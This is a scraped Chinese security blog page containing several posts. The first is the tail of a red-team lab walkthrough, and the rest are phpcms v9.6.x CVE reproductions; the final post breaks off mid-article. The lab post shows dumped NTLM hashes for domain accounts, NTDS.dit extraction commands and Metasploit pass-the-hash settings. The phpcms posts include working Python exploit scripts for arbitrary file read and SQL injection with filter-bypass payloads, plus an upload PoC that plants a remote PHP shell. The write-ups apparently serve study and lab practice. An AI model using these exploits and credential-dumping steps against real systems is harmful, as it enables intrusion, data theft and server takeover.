+Object Security ID   : S-1-5-21-2952760202-1353902439-2381784089-502
+Object Relative ID   : 502
+
+Credentials:
+  Hash NTLM: 58e91a5ac358d86513ab224312314061
+
+Object RDN           : Read-only Domain Controllers
+
+** SAM ACCOUNT **
+
+SAM Username         : Administrator
+Object Security ID   : S-1-5-21-2952760202-1353902439-2381784089-500
+Object Relative ID   : 500
+
+Credentials:
+  Hash NTLM: a45a7246dd74b64a67f22fd7020f1bd8
+
+Object RDN           : Administrators
+
+
+502    krbtgt    58e91a5ac358d86513ab224312314061
+1106    ligang    1e3d22f88dfd250c9312d21686c60f41
+1107    DEV1$    bed18e5b9d13bb384a3041a10d43c01b
+1104    ROOT-TVI862UBEH$    5604267003351107febdc6ed4e2dfdce
+1105    STU1$    cb45e05d22e8106184056e55ac541149
+500    Administrator    a45a7246dd74b64a67f22fd7020f1bd8
+1001    OWA$    f8ddc71a57488df64708651271185969
+1108    gqy    aa3afe73b6e0c2d87b3a428bf696ae71
+1000    liukaifeng01    a45a7246dd74b64a67f22fd7020f1bd8
+</code></pre><p>可惜没有明文密码</p>
+<p>利用pth登陆Administrator</p>
+<p>先导出system 和 NTDS.dit</p>
+<pre><code>ntdsutil &quot;ac i ntds&quot; ifm &quot;create full c:\users\tmp&quot; q q
+
+NTDSDumpEx -d ntds.dit -s system -o domain.txt
+得到hash
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:a45a7246dd74b64a67f22fd7020f1bd8:::</code></pre><p>用msf上的<code>exploit/windows/smb/psexec</code>来进行pth攻击</p>
+<pre><code>use exploit/windows/smb/psexec
+set payload windows/meterpreter/bind_tcp
+set rhost xxx
+set lport xxx
+set rhosts 192.168.52.138
+set smbuser Administrator
+set smbpass aad3b435b51404eeaad3b435b51404ee:a45a7246dd74b64a67f22fd7020f1bd8</code></pre><p><img src="https://i.loli.net/2020/02/17/9oLDYlWv5GBwOUN.png" alt="image12506"></p>
+<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/02/17/vulnstackATT&CK红队评估靶场1渗透记录/">http://blog.ccreater.top/2020/02/17/vulnstackATT&amp;CK红队评估靶场1渗透记录/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://blog.ccreater.top/2020/02/17/vulnstackATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E9%9D%B6%E5%9C%BA1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/" data-id="ck917a7cr002yu8v093e2byc1" data-title="vulnstackATT&amp;CK红队评估靶场1渗透记录" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-phpcmsv9.6.1任意文件读取" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/02/13/phpcmsv9.6.1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="article-date">
+  <time class="dt-published" datetime="2020-02-13T08:09:55.411Z" itemprop="datePublished">2020-02-13</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/02/13/phpcmsv9.6.1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/">phpcmsv9.6.1任意文件读取</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="phpcmsv9-6-1任意文件读取"><a href="#phpcmsv9-6-1任意文件读取" class="headerlink" title="phpcmsv9.6.1任意文件读取"></a>phpcmsv9.6.1任意文件读取</h1><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>漏洞位置: <code>phpcms/modules/content/down.php</code> 。在该文件的 <code>download</code> 方法中最后一行调用了 <code>file_down</code> 文件下载函数，我们可以看到其第一个参数是要读取的文件路径。 </p>
+<pre><code class="php">    public function download() {
+        $a_k = trim($_GET[&#39;a_k&#39;]);
+        $pc_auth_key = md5(pc_base::load_config(&#39;system&#39;,&#39;auth_key&#39;).$_SERVER[&#39;HTTP_USER_AGENT&#39;].&#39;down&#39;);
+        $a_k = sys_auth($a_k, &#39;DECODE&#39;, $pc_auth_key);
+        if(empty($a_k)) showmessage(L(&#39;illegal_parameters&#39;));
+        unset($i,$m,$f,$t,$ip);
+        parse_str($a_k);        
+        ...
+        $starttime = intval($t);
+        if(preg_match(&#39;/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i&#39;,$f) || strpos($f, &quot;:\\&quot;)!==FALSE || strpos($f,&#39;..&#39;)!==FALSE) showmessage(L(&#39;url_error&#39;));
+        $fileurl = trim($f);
+        if(!$downid || empty($fileurl) || !preg_match(&quot;/[0-9]{10}/&quot;, $starttime) || !preg_match(&quot;/[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}/&quot;, $ip) || $ip != ip()) showmessage(L(&#39;illegal_parameters&#39;));    
+        $endtime = SYS_TIME - $starttime;
+        if($endtime &gt; 3600) showmessage(L(&#39;url_invalid&#39;));
+        if($m) $fileurl = trim($s).trim($fileurl);
+        if(preg_match(&#39;/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i&#39;,$fileurl) ) showmessage(L(&#39;url_error&#39;));
+        //远程文件
+        if(strpos($fileurl, &#39;:/&#39;) &amp;&amp; (strpos($fileurl, pc_base::load_config(&#39;system&#39;,&#39;upload_url&#39;)) === false)) { 
+            header(&quot;Location: $fileurl&quot;);
+        } else {
+            if($d == 0) {
+                header(&quot;Location: &quot;.$fileurl);
+            } else {
+                $fileurl = str_replace(array(pc_base::load_config(&#39;system&#39;,&#39;upload_url&#39;),&#39;/&#39;), array(pc_base::load_config(&#39;system&#39;,&#39;upload_path&#39;),DIRECTORY_SEPARATOR), $fileurl);
+                $filename = basename($fileurl);
+                //处理中文文件
+                if(preg_match(&quot;/^([\s\S]*?)([\x81-\xfe][\x40-\xfe])([\s\S]*?)/&quot;, $fileurl)) {
+                    $filename = str_replace(array(&quot;%5C&quot;, &quot;%2F&quot;, &quot;%3A&quot;), array(&quot;\\&quot;, &quot;/&quot;, &quot;:&quot;), urlencode($fileurl));
+                    $filename = urldecode(basename($filename));
+                }
+                $ext = fileext($filename);
+                $filename = date(&#39;Ymd_his&#39;).random(3).&#39;.&#39;.$ext;
+                $fileurl=str_replace(array(&quot;&lt;&quot;,&quot;&gt;&quot;),&quot;&quot;,$fileurl);
+                file_down($fileurl, $filename);
+            }
+        }
+    }</code></pre>
+<p>我们跟进<code>file_down</code>:</p>
+<pre><code class="php">function file_down($filepath, $filename = &#39;&#39;) {
+    if(!$filename) $filename = basename($filepath);
+    if(is_ie()) $filename = rawurlencode($filename);
+    $filetype = fileext($filename);
+    $filesize = sprintf(&quot;%u&quot;, filesize($filepath));
+    if(ob_get_length() !== false) @ob_end_clean();
+    header(&#39;Pragma: public&#39;);
+    header(&#39;Last-Modified: &#39;.gmdate(&#39;D, d M Y H:i:s&#39;) . &#39; GMT&#39;);
+    header(&#39;Cache-Control: no-store, no-cache, must-revalidate&#39;);
+    header(&#39;Cache-Control: pre-check=0, post-check=0, max-age=0&#39;);
+    header(&#39;Content-Transfer-Encoding: binary&#39;);
+    header(&#39;Content-Encoding: none&#39;);
+    header(&#39;Content-type: &#39;.$filetype);
+    header(&#39;Content-Disposition: attachment; filename=&quot;&#39;.$filename.&#39;&quot;&#39;);
+    header(&#39;Content-length: &#39;.$filesize);
+    readfile($filepath);
+    exit;
+}</code></pre>
+<p>可以看到他会直接读取文件然后,exit</p>
+<p>我们再看下<code>download</code>中的<code>$fileurl</code>的生成过程:</p>
+<pre><code class="php">if(preg_match(&#39;/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i&#39;,$f) || strpos($f, &quot;:\\&quot;)!==FALSE || strpos($f,&#39;..&#39;)!==FALSE) showmessage(L(&#39;url_error&#39;));
+if($m) $fileurl = trim($s).trim($fileurl);
+if(preg_match(&#39;/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i&#39;,$fileurl) ) showmessage(L(&#39;url_error&#39;));
+$fileurl = str_replace(array(pc_base::load_config(&#39;system&#39;,&#39;upload_url&#39;),&#39;/&#39;), array(pc_base::load_config(&#39;system&#39;,&#39;upload_path&#39;),DIRECTORY_SEPARATOR), $fileurl);
+$fileurl=str_replace(array(&quot;&lt;&quot;,&quot;&gt;&quot;),&quot;&quot;,$fileurl);</code></pre>
+<p><code>$fileurl</code>由<code>$f</code>产生的,其中不能带有php等关键字,但是我们可以利用最后一行的str_replace来绕过,而<code>$f</code>由<code>parse_str($a_k)</code>得来的</p>
+<p>那么接下来我们要找一处</p>
+<pre><code class="php">$pc_auth_key = md5(pc_base::load_config(&#39;system&#39;,&#39;auth_key&#39;).$_SERVER[&#39;HTTP_USER_AGENT&#39;].&#39;down&#39;);
+$a_k = sys_auth($a_k, &#39;DECODE&#39;, $pc_auth_key);</code></pre>
+<p>以<code>$pc_auth_key</code>作为密钥的加密点</p>
+<p><img src="https://i.loli.net/2020/02/13/csXBxCmkdWqj3or.png" alt="image3860"></p>
+<p>显然只有中间的那个可以</p>
+<pre><code class="php">$pc_auth_key = md5(pc_base::load_config(&#39;system&#39;,&#39;auth_key&#39;).$_SERVER[&#39;HTTP_USER_AGENT&#39;].&#39;down&#39;);
+$a_k = urlencode(sys_auth(&quot;i=$i&amp;d=$d&amp;s=$s&amp;t=&quot;.SYS_TIME.&quot;&amp;ip=&quot;.ip().&quot;&amp;m=&quot;.$m.&quot;&amp;f=$f&amp;modelid=&quot;.$modelid, &#39;ENCODE&#39;, $pc_auth_key));
+$downurl = &#39;?m=content&amp;c=down&amp;a=download&amp;a_k=&#39;.$a_k;</code></pre>
+<p>而<code>$i,$m,$f</code>等都是从<code>parse_str($a_k);</code>获得</p>
+<pre><code class="php">        parse_str($a_k);
+        if(isset($i)) $i = $id = intval($i);
+        if(!isset($m)) showmessage(L(&#39;illegal_parameters&#39;));
+        if(!isset($modelid)||!isset($catid)) showmessage(L(&#39;illegal_parameters&#39;));
+        if(empty($f)) showmessage(L(&#39;url_invalid&#39;));</code></pre>
+<p>接下来就跟9.6.0版本的sql注入相同了</p>
+<h2 id="检测脚本"><a href="#检测脚本" class="headerlink" title="检测脚本"></a>检测脚本</h2><pre><code class="python">import re
+import requests
+import random
+from urllib.parse import quote
+def poc(url,proxies={}):
+    sess=requests.session()
+    sess.get(&quot;%s/index.php?m=wap&amp;siteid=1&quot;%url)
+    sess.proxies=proxies
+    pre=list(sess.cookies.get_dict())[0][:5]+&quot;_&quot;
+    userid=sess.cookies.get_dict()[pre+&quot;siteid&quot;]
+    param={
+        &quot;m&quot;:&quot;attachment&quot;,
+        &quot;c&quot;:&quot;attachments&quot;,
+        &quot;a&quot;:&quot;swfupload_json&quot;,
+        &quot;src&quot;:&quot;=1&amp;m=aa&amp;i=1&amp;modelid=1&amp;catid=1&amp;f=%s&amp;ss=&quot; % quote(&quot;index.p&lt;h&lt;p&amp;d=1&quot;)
+    }
+    sess.post(&quot;%s/index.php&quot;%url,params=param,data={&quot;userid_flash&quot;:userid})
+    #print(sess.cookies.get_dict())
+    a_k=sess.cookies.get_dict()[pre+&quot;att_json&quot;]
+    result=sess.get(&quot;%s/index.php?m=content&amp;c=down&amp;a=init&amp;a_k=%s&quot;%(url,a_k)).text
+    #print(userid,a_k)
+    a_k=re.search(&#39;&#39;&#39;a_k=([^&quot;]*)&#39;&#39;&#39;,result).groups()[0]
+    #print(result)
+    #print(a_k)
+    res=sess.get(&quot;%s/index.php?m=content&amp;c=down&amp;a=download&amp;a_k=%s&quot;%(url,a_k))
+    if res.status_code==200 and &quot;pc_base::creat_app();&quot; in res.text:
+        return True
+    else :
+        return False
+
+
+
+#,{&quot;http&quot;:&quot;socks5://127.0.0.1:1080&quot;}
+print(poc(&quot;http://127.0.0.1/cms/phpcms/9.6.1/&quot;))</code></pre>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://mochazz.github.io/2019/07/18/phpcms漏洞分析合集/" target="_blank" rel="noopener">https://mochazz.github.io/2019/07/18/phpcms漏洞分析合集/</a> </p>
+<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/02/13/phpcmsv9.6.1任意文件读取/">http://blog.ccreater.top/2020/02/13/phpcmsv9.6.1任意文件读取/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://blog.ccreater.top/2020/02/13/phpcmsv9.6.1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" data-id="ck917a7cd002iu8v0ccvz2ays" data-title="phpcmsv9.6.1任意文件读取" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-phpcmsv9.6.0SQL注入" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/02/13/phpcmsv9.6.0SQL%E6%B3%A8%E5%85%A5/" class="article-date">
+  <time class="dt-published" datetime="2020-02-12T16:25:04.827Z" itemprop="datePublished">2020-02-13</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/02/13/phpcmsv9.6.0SQL%E6%B3%A8%E5%85%A5/">phpcmsv9.6.0SQL注入</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="phpcmsv9-6-0SQL注入"><a href="#phpcmsv9-6-0SQL注入" class="headerlink" title="phpcmsv9.6.0SQL注入"></a>phpcmsv9.6.0SQL注入</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ol>
+<li>开启wap</li>
+<li>phpcms 版本小于等于9.6.0</li>
+</ol>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>漏洞信息:</p>
+<blockquote>
+<p>这个版本的 <strong>SQL注入</strong> 主要在于程序对解密后的数据没有进行过滤. 漏洞文件: <strong>phpcms/modules/content/down.php</strong> 。在其 <strong>init</strong> 方法中，从 <strong>GET</strong> 数据中获取了 <strong>a_k</strong> 的值 ,解密后直接变量覆盖,导致命令执行</p>
+</blockquote>
+<pre><code class="php">public function init() {
+        $a_k = trim($_GET[&#39;a_k&#39;]);
+        $a_k = sys_auth($a_k, &#39;DECODE&#39;, pc_base::load_config(&#39;system&#39;,&#39;auth_key&#39;));
+        if(empty($a_k)) showmessage(L(&#39;illegal_parameters&#39;));
+        parse_str($a_k);
+        if(isset($i)) $i = $id = intval($i);
+        if(!isset($m)) showmessage(L(&#39;illegal_parameters&#39;));
+        if(!isset($modelid)||!isset($catid)) showmessage(L(&#39;illegal_parameters&#39;));
+        if(empty($f)) showmessage(L(&#39;url_invalid&#39;));
+        $allow_visitor = 1;
+        $MODEL = getcache(&#39;model&#39;,&#39;commons&#39;);
+        $tablename = $this-&gt;db-&gt;table_name = $this-&gt;db-&gt;db_tablepre.$MODEL[$modelid][&#39;tablename&#39;];
+        $this-&gt;db-&gt;table_name = $tablename.&#39;_data&#39;;
+        $rs = $this-&gt;db-&gt;get_one(array(&#39;id&#39;=&gt;$id));    
+        ...
+    }</code></pre>
+<p><code>$this-&gt;db-&gt;get_one(array(&#39;id&#39;=&gt;$id));</code>跟进去</p>
+<pre><code class="php">final public function get_one($where = &#39;&#39;, $data = &#39;*&#39;, $order = &#39;&#39;, $group = &#39;&#39;) {
+        if (is_array($where)) $where = $this-&gt;sqls($where);
+        return $this-&gt;db-&gt;get_one($data, $this-&gt;table_name, $where, $order, $group);
+    }</code></pre>
+<pre><code class="php">final public function sqls($where, $font = &#39; AND &#39;) {
+        if (is_array($where)) {
+            $sql = &#39;&#39;;
+            foreach ($where as $key=&gt;$val) {
+                $sql .= $sql ? &quot; $font `$key` = &#39;$val&#39; &quot; : &quot; `$key` = &#39;$val&#39;&quot;;
+            }
+            return $sql;
+        } else {
+            return $where;
+        }
+    }</code></pre>
+<pre><code class="php">public function get_one($data, $table, $where = &#39;&#39;, $order = &#39;&#39;, $group = &#39;&#39;) {
+        $where = $where == &#39;&#39; ? &#39;&#39; : &#39; WHERE &#39;.$where;
+        $order = $order == &#39;&#39; ? &#39;&#39; : &#39; ORDER BY &#39;.$order;
+        $group = $group == &#39;&#39; ? &#39;&#39; : &#39; GROUP BY &#39;.$group;
+        $limit = &#39; LIMIT 1&#39;;
+        $field = explode( &#39;,&#39;, $data);
+        array_walk($field, array($this, &#39;add_special_char&#39;));
+        $data = implode(&#39;,&#39;, $field);
+
+        $sql = &#39;SELECT &#39;.$data.&#39; FROM `&#39;.$this-&gt;config[&#39;database&#39;].&#39;`.`&#39;.$table.&#39;`&#39;.$where.$group.$order.$limit;
+        $this-&gt;execute($sql);
+        $res = $this-&gt;fetch_next();
+        $this-&gt;free_result();
+        return $res;
+    }</code></pre>
+<p>没有对解密后的id进行任何过滤</p>
+<p>接着要找一个能用相同密钥加密的地方,这样便无需暴露auth_key就能执行恶意sql语句</p>
+<p>我们利用<code>set_cookie</code>来生成加密数据</p>
+<p><code>setcookie($var, sys_auth($value, &#39;ENCODE&#39;), $time, pc_base::load_config(&#39;system&#39;,&#39;cookie_path&#39;), pc_base::load_config(&#39;system&#39;,&#39;cookie_domain&#39;), $s);</code></p>
+<p>查找调用<code>set_cookie</code>且值<code>$value</code>可控的位置</p>
+<p><code>phpcms/modules/attachment/attachments.php</code> 文件的 <code>swfupload_json</code> 方法有满足我们需要的代码。(菜鸡直接看别人找到的)</p>
+<pre><code class="php">public function swfupload_json() {
+        $arr[&#39;aid&#39;] = intval($_GET[&#39;aid&#39;]);
+        $arr[&#39;src&#39;] = safe_replace(trim($_GET[&#39;src&#39;]));
+        $arr[&#39;filename&#39;] = urlencode(safe_replace($_GET[&#39;filename&#39;]));
+        $json_str = json_encode($arr);
+        $att_arr_exist = param::get_cookie(&#39;att_json&#39;);
+        $att_arr_exist_tmp = explode(&#39;||&#39;, $att_arr_exist);
+        if(is_array($att_arr_exist_tmp) &amp;&amp; in_array($json_str, $att_arr_exist_tmp)) {
+            return true;
+        } else {
+            $json_str = $att_arr_exist ? $att_arr_exist.&#39;||&#39;.$json_str : $json_str;
+            param::set_cookie(&#39;att_json&#39;,$json_str);
+            return true;            
+        }
+    }</code></pre>
+<p><code>$arr[&#39;src&#39;] = safe_replace(trim($_GET[&#39;src&#39;]));</code>,跟进<code>safe_replace</code></p>
+<pre><code class="php">function safe_replace($string) {
+    $string = str_replace(&#39;%20&#39;,&#39;&#39;,$string);
+    $string = str_replace(&#39;%27&#39;,&#39;&#39;,$string);
+    $string = str_replace(&#39;%2527&#39;,&#39;&#39;,$string);
+    $string = str_replace(&#39;*&#39;,&#39;&#39;,$string);
+    $string = str_replace(&#39;&quot;&#39;,&#39;&amp;quot;&#39;,$string);
+    $string = str_replace(&quot;&#39;&quot;,&#39;&#39;,$string);
+    $string = str_replace(&#39;&quot;&#39;,&#39;&#39;,$string);
+    $string = str_replace(&#39;;&#39;,&#39;&#39;,$string);
+    $string = str_replace(&#39;&lt;&#39;,&#39;&amp;lt;&#39;,$string);
+    $string = str_replace(&#39;&gt;&#39;,&#39;&amp;gt;&#39;,$string);
+    $string = str_replace(&quot;{&quot;,&#39;&#39;,$string);
+    $string = str_replace(&#39;}&#39;,&#39;&#39;,$string);
+    $string = str_replace(&#39;\\&#39;,&#39;&#39;,$string);
+    return $string;
+}</code></pre>
+<p>虽然这里单引号被过滤了,但是前面是用<code>parse_str($a_k);</code>来恢复变量的,我们可以利用<code>safe_replace</code>能将某些字符替换为空格用url编码来绕过黑名单</p>
+<p>但是在调用<code>swfupload_json</code> 前,它还会调用<code>__construct</code>方法</p>
+<pre><code class="php">function __construct() {
+        pc_base::load_app_func(&#39;global&#39;);
+        $this-&gt;upload_url = pc_base::load_config(&#39;system&#39;,&#39;upload_url&#39;);
+        $this-&gt;upload_path = pc_base::load_config(&#39;system&#39;,&#39;upload_path&#39;);        
+        $this-&gt;imgext = array(&#39;jpg&#39;,&#39;gif&#39;,&#39;png&#39;,&#39;bmp&#39;,&#39;jpeg&#39;);
+        $this-&gt;userid = $_SESSION[&#39;userid&#39;] ? $_SESSION[&#39;userid&#39;] : (param::get_cookie(&#39;_userid&#39;) ? param::get_cookie(&#39;_userid&#39;) : sys_auth($_POST[&#39;userid_flash&#39;],&#39;DECODE&#39;));
+        $this-&gt;isadmin = $this-&gt;admin_username = $_SESSION[&#39;roleid&#39;] ? 1 : 0;
+        $this-&gt;groupid = param::get_cookie(&#39;_groupid&#39;) ? param::get_cookie(&#39;_groupid&#39;) : 8;
+        //判断是否登录
+        if(empty($this-&gt;userid)){
+            showmessage(L(&#39;please_login&#39;,&#39;&#39;,&#39;member&#39;));
+        }
+    }</code></pre>
+<p>我们需要用<code>sys_auth($_POST[&#39;userid_flash&#39;],&#39;DECODE&#39;)</code>来生成<code>$this-&gt;userid</code>,来绕过死亡exit</p>
+<p>这次我们还需要找一个地方来生成<code>userid</code>,但是限制更少了,只要<code>$this-&gt;userid</code>不为空即可</p>
+<p> 我们可以搜到 <code>phpcms/modules/wap/index.php</code> 文件，在该文件中 <code>$_GET[&#39;siteid&#39;]</code> 可控，并且可以通过 <strong>cookie</strong> 获得加密后的数据,虽然有intval来过滤</p>
+<pre><code class="php">function __construct() {        
+        $this-&gt;db = pc_base::load_model(&#39;content_model&#39;);
+        $this-&gt;siteid = isset($_GET[&#39;siteid&#39;]) &amp;&amp; (intval($_GET[&#39;siteid&#39;]) &gt; 0) ? intval(trim($_GET[&#39;siteid&#39;])) : (param::get_cookie(&#39;siteid&#39;) ? param::get_cookie(&#39;siteid&#39;) : 1);
+        param::set_cookie(&#39;siteid&#39;,$this-&gt;siteid);    
+        $this-&gt;wap_site = getcache(&#39;wap_site&#39;,&#39;wap&#39;);
+        $this-&gt;types = getcache(&#39;wap_type&#39;,&#39;wap&#39;);
+        $this-&gt;wap = $this-&gt;wap_site[$this-&gt;siteid];
+        define(&#39;WAP_SITEURL&#39;, $this-&gt;wap[&#39;domain&#39;] ? $this-&gt;wap[&#39;domain&#39;].&#39;index.php?&#39; : APP_PATH.&#39;index.php?m=wap&amp;siteid=&#39;.$this-&gt;siteid);
+        if($this-&gt;wap[&#39;status&#39;]!=1) exit(L(&#39;wap_close_status&#39;));
+    }</code></pre>
+<p>于是整个攻击链便完整了</p>
+<p>先利用wap来获得<code>userid</code></p>
+<p><code>http://127.0.0.1/cms/phpcms/9.6.0/index.php?m=wap&amp;siteid=1</code></p>
+<p><code>2a8a6kid_pv1EoSGXugr-5BZDZWzDhaB7W3EtXou</code></p>
+<p>再利用attachment来获得加密的恶意sql语句</p>
+<pre><code>http://127.0.0.1/cms/phpcms/9.6.0/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;src=(看poc吧)
+post:
+userid_flash=2a8a6kid_pv1EoSGXugr-5BZDZWzDhaB7W3EtXou</code></pre><h2 id="检测脚本"><a href="#检测脚本" class="headerlink" title="检测脚本"></a>检测脚本</h2><pre><code class="python">import re
+import requests
+import random
+
+def poc(url,proxies={}):
+    sess=requests.session()
+    sess.get(&quot;%s/index.php?m=wap&amp;siteid=1&quot;%url)
+    sess.proxies=proxies
+    pre=list(sess.cookies.get_dict())[0][:5]+&quot;_&quot;
+    userid=sess.cookies.get_dict()[pre+&quot;siteid&quot;]
+    param={
+        &quot;m&quot;:&quot;attachment&quot;,
+        &quot;c&quot;:&quot;attachments&quot;,
+        &quot;a&quot;:&quot;swfupload_json&quot;,
+        &quot;src&quot;:&quot;=1&amp;id=nobodyasdfsdsf%2;7-(updatexml(1,concat(0x7e,(select%2;0user()),0x7e),1))%23&amp;m=1&amp;modelid=1&amp;catid=1&amp;f=1&amp;ss&quot;
+    }
+    sess.post(&quot;%s/index.php&quot;%url,params=param,data={&quot;userid_flash&quot;:userid})
+    a_k=sess.cookies.get_dict()[pre+&quot;att_json&quot;]
+    result=sess.get(&quot;%s/index.php?m=content&amp;c=down&amp;a=init&amp;a_k=%s&quot;%(url,a_k)).text
+    #print(userid,a_k)
+    if &quot;XPATH syntax error&quot; in result:
+        return True
+    return False
+
+
+#,{&quot;http&quot;:&quot;socks5://127.0.0.1:1080&quot;}
+print(poc(&quot;http://127.0.0.1/cms/phpcms/9.6.0/&quot;))</code></pre>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://mochazz.github.io/2019/07/18/phpcms漏洞分析合集" target="_blank" rel="noopener">https://mochazz.github.io/2019/07/18/phpcms漏洞分析合集</a></p>
+<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/02/13/phpcmsv9.6.0SQL注入/">http://blog.ccreater.top/2020/02/13/phpcmsv9.6.0SQL注入/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://blog.ccreater.top/2020/02/13/phpcmsv9.6.0SQL%E6%B3%A8%E5%85%A5/" data-id="ck917a7cb002gu8v0g4l117wn" data-title="phpcmsv9.6.0SQL注入" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-phpcms960任意文件上传复现" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/02/12/phpcms960%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%8D%E7%8E%B0/" class="article-date">
+  <time class="dt-published" datetime="2020-02-12T13:55:39.359Z" itemprop="datePublished">2020-02-12</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/02/12/phpcms960%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%8D%E7%8E%B0/">phpcms960任意文件上传复现</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="phpcmsv9-6-0任意文件上传"><a href="#phpcmsv9-6-0任意文件上传" class="headerlink" title="phpcmsv9.6.0任意文件上传"></a>phpcmsv9.6.0任意文件上传</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>phpcms v9.6.0</p>
+<p>开启用户注册功能</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>根据网络上提供的poc进行漏洞复现:</p>
+<pre><code class="python">import re
+import requests
+
+
+def poc(url):
+    u = &#39;{}/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1&#39;.format(url)
+    data = {
+        &#39;siteid&#39;: &#39;1&#39;,
+        &#39;modelid&#39;: &#39;1&#39;,
+        &#39;username&#39;: &#39;test&#39;,
+        &#39;password&#39;: &#39;testxx&#39;,
+        &#39;email&#39;: &#39;test@test.com&#39;,
+        &#39;info[content]&#39;: &#39;&lt;img src=http://url/shell.txt?.php#.jpg&gt;&#39;,
+        &#39;dosubmit&#39;: &#39;1&#39;,
+    }
+    rep = requests.post(u, data=data)
+
+    shell = &#39;&#39;
+    re_result = re.findall(r&#39;&amp;lt;img src=(.*)&amp;gt&#39;, rep.content)
+    if len(re_result):
+        shell = re_result[0]
+        print shell
+</code></pre>
+<p>漏洞的关键位置</p>
